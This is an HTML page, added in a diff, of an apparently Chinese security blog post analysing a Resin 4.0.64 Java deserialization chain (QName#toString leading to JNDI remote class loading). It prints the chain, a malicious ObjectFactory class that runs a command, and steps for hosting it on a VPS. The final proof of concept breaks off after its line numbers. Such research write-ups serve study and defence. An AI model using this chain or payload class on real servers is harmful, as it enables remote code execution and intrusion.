@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Resin介绍Resin是由Caucho Technology开发的一款轻量级的、高性能的开源Java应用服务器，它支持JSP和Servlet，和Apache Server一样，它擅长处理动态内容，也能高效显示静态内容，旨在提供可靠的Web应用程序和服务的运行环境。 影响版本&amp;环境搭建Resin &#x3D; 4.0.64 在pom.xml中添加依赖 12345&lt;dependency">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化之Resin反序列化">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="Resin介绍Resin是由Caucho Technology开发的一款轻量级的、高性能的开源Java应用服务器，它支持JSP和Servlet，和Apache Server一样，它擅长处理动态内容，也能高效显示静态内容，旨在提供可靠的Web应用程序和服务的运行环境。 影响版本&amp;环境搭建Resin &#x3D; 4.0.64 在pom.xml中添加依赖 12345&lt;dependency">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251120181412150.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251120182043504.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251120182236095.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132617056.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132651286.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132752672.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132514897.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121145907328.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121150419712.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121150450044.png">
+<meta property="article:published_time" content="2025-11-20T07:55:29.000Z">
+<meta property="article:modified_time" content="2025-11-23T11:00:43.749Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251120181412150.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java反序列化之Resin反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/11/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E5%8E%9F%E7%94%9F%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Java反序列化之Resin反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Java反序列化之Resin反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化之Resin反序列化&body=Check out this article: https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Java反序列化之Resin反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Java反序列化之Resin反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BResin%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Java反序列化之Resin反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Resin%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">Resin介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">影响版本&amp;环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QName-toString%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">QName#toString利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#QNAME-toString"><span class="toc-number">3.1.</span> <span class="toc-text">QNAME#toString</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContinuationContext-composeName"><span class="toc-number">3.2.</span> <span class="toc-text">ContinuationContext#composeName</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-XString%E8%A7%A6%E5%8F%91toString"><span class="toc-number">3.3.</span> <span class="toc-text">HashMap+XString触发toString</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E9%93%BE%E5%AD%901"><span class="toc-number">3.3.1.</span> <span class="toc-text">最终链子1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88POC1"><span class="toc-number">3.3.2.</span> <span class="toc-text">最终POC1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E4%BB%BB%E6%84%8Fgetter%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">ROME反序列化调用任意getter方法</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java反序列化之Resin反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-20T07:55:29.000Z" class="dt-published" itemprop="datePublished">2025-11-20</time>
+        
+        (Updated: <time datetime="2025-11-23T11:00:43.749Z" class="dt-updated" itemprop="dateModified">2025-11-23</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/javasec/">javasec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Resin介绍"><a href="#Resin介绍" class="headerlink" title="Resin介绍"></a>Resin介绍</h2><p>Resin是由Caucho Technology开发的一款轻量级的、高性能的开源Java应用服务器，它支持JSP和Servlet，和Apache Server一样，它擅长处理动态内容，也能高效显示静态内容，旨在提供可靠的Web应用程序和服务的运行环境。</p>
+<h2 id="影响版本-环境搭建"><a href="#影响版本-环境搭建" class="headerlink" title="影响版本&amp;环境搭建"></a>影响版本&amp;环境搭建</h2><p>Resin &#x3D; 4.0.64</p>
+<p>在pom.xml中添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.64<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它和hessian在一个组件里，所以会有一定的联系，在导入依赖后也能看到hessian的依赖</p>
+<h2 id="QName-toString利用链"><a href="#QName-toString利用链" class="headerlink" title="QName#toString利用链"></a>QName#toString利用链</h2><h3 id="QNAME-toString"><a href="#QNAME-toString" class="headerlink" title="QNAME#toString"></a>QNAME#toString</h3><p>漏洞点在于QNAME的toString，来看看QName是干什么的</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251120181412150.png" alt="image-20251120181412150"></p>
+<p>是用来表示解析的JNDI名称的，而<code>_context</code>表示根上下文命名空间的，<code>_items</code>是用来保存名字片段的数组</p>
+<p>然后我们看看toString函数在干啥</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size(); i++) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) get(i);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (name != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        name = _context.composeName(str, name);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        name = name + <span class="string">&quot;/&quot;</span> + str;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      name = str;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> name == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>for循环遍历 <code>_items</code>，调用composeName方法按_context上下文的命名规则组合成一个完整的名字；如果规则无法组合就直接用<code>/</code>进行拼接</p>
+<p>QName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 <code>composeName</code> 方法。</p>
+<p>我们看看构造方法</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251120182043504.png" alt="image-20251120182043504"></p>
+<p>是公开属性的，那我们这里可以找到一个合适的<code>_context</code>去调用任意<strong>继承了Context接口的类</strong>的<code>composeName</code> 方法。</p>
+<h3 id="ContinuationContext-composeName"><a href="#ContinuationContext-composeName" class="headerlink" title="ContinuationContext#composeName"></a>ContinuationContext#composeName</h3><p>找到一个ContinuationContext类，它继承了<code>Context</code>接口，我们看看它的composeName方法</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251120182236095.png" alt="image-20251120182236095"></p>
+<p>跟进这个方法看一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Context <span class="title function_">getTargetContext</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (contCtx == <span class="literal">null</span>) &#123;<span class="comment">//如果还没初始化就创建它，否则就直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (cpe.getResolvedObj() == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)cpe.fillInStackTrace();</span><br><span class="line"></span><br><span class="line">        contCtx = NamingManager.getContext(cpe.getResolvedObj(),</span><br><span class="line">                                           cpe.getAltName(),</span><br><span class="line">                                           cpe.getAltNameCtx(),</span><br><span class="line">                                           env);</span><br><span class="line">        <span class="keyword">if</span> (contCtx == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)cpe.fillInStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> contCtx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cpe就是ContinuationContext类的构造方法里的CannotProceedException类的对象，getResolvedObj()返回的是已经解析到的对象，这个对象可能是一个Context 对象，也可能是Reference 对象</p>
+<p>我们跟进getContext方法看一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Context <span class="title function_">getContext</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Context) &#123;</span><br><span class="line">        <span class="comment">// %%% Ignore environment for now.  OK since method not public.</span></span><br><span class="line">        <span class="keyword">return</span> (Context)obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        answer = getObjectInstance(obj, name, nameCtx, environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        ne.setRootCause(e);</span><br><span class="line">        <span class="keyword">throw</span> ne;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (answer <span class="keyword">instanceof</span> Context)</span><br><span class="line">        ? (Context)answer</span><br><span class="line">        : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果这个对象是Context 对象，就直接返回</p>
+<p>跟进getObjectInstance函数</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132617056.png" alt="image-20251121132617056"></p>
+<p>先是判断传入对象是否是Reference或可转换为Reference，后面会对Reference进行解析，重点在于<code>factory = getObjectFactoryFromReference(ref, f);</code>这段代码，他会从Reference中获取工厂类的位置或远程URL去加载类，这也意味着会存在JNDI的引用解析</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132651286.png" alt="image-20251121132651286"></p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132752672.png" alt="image-20251121132752672"></p>
+<p>最终是通过URLClassLoader进行类加载的，所以这里能进行远程类加载。</p>
+<p>从上面可以看出，在getTargetContext函数里面，如果cpe是一个Reference引用对象的话，就会触发JNDI的引用解析过程，从而达到一个JNDI注入的效果</p>
+<p>所以我们在获取到CannotProceedException的对象的时候就需要通过<code>setResolvedObj</code>方法把恶意对象塞进去。</p>
+<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251121132514897.png" alt="image-20251121132514897"></p>
+<p>最后我们再进行toString的触发就行了</p>
+<h3 id="HashMap-XString触发toString"><a href="#HashMap-XString触发toString" class="headerlink" title="HashMap+XString触发toString"></a>HashMap+XString触发toString</h3><h4 id="最终链子1"><a href="#最终链子1" class="headerlink" title="最终链子1"></a>最终链子1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject()-&gt;</span><br><span class="line">    HashMap#putVal()-&gt;</span><br><span class="line">    	XString#equals()-&gt;</span><br><span class="line">    		QName#toString()-&gt;</span><br><span class="line">    			ContinuationContext#composeName()-&gt;</span><br><span class="line">    				URLClassLoader#newInstance()</span><br></pre></td></tr></table></figure>
+
+<h4 id="最终POC1"><a href="#最终POC1" class="headerlink" title="最终POC1"></a>最终POC1</h4><p>在VPS上写一个恶意类Exploit</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">exploit</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成class文件</p>
+<p>在构建目录下开启8000端口进行访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>然后我们写poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 